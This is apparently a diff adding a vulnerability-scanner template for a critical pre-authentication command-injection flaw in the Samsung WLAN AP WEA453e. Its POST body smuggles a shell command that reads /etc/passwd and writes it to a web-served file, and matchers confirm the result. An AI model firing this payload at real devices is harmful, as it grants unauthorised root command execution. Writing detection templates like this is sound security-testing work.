@@ -1,0 +1,33 @@
+http:
+    - body: command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
+      matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+            - bin:.*:1:1
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/(download)/tmp/poc.txt'
+id: samsung-wlan-ap-rce
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means an attacker could run code as root remotely without logging in.
+    metadata:
+        max-request: 1
+    name: Samsung WLAN AP WEA453e - Remote Code Execution
+    reference:
+        - https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba
+    severity: critical
+    tags:
+        - samsung
+        - Logging
+        - Samsung-WLAN-AP
